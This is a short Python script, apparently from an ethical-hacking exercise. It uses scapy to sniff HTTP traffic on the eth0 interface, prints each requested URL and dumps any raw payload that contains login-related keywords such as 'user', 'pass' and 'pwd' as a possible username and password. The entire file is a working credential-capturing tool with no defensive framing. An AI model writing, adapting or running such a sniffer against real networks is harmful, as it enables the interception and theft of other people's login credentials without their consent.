import scapy.all as scapy
from scapy.layers import http  # pip install scapy_http
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        log_info = get_login(packet)
        if log_info:
            print("\n\n[+] Possible username/password >> " + log_info + "\n\n")


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "user", "name", "pass", "pword", "pwd", "mail", "navn", "bruk", "brug"]  # no need to use full names since this will check for substrings of the word. use covers username, user etc.
        for keyword in keywords:
            if keyword in load:
                return load



def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


sniff("eth0")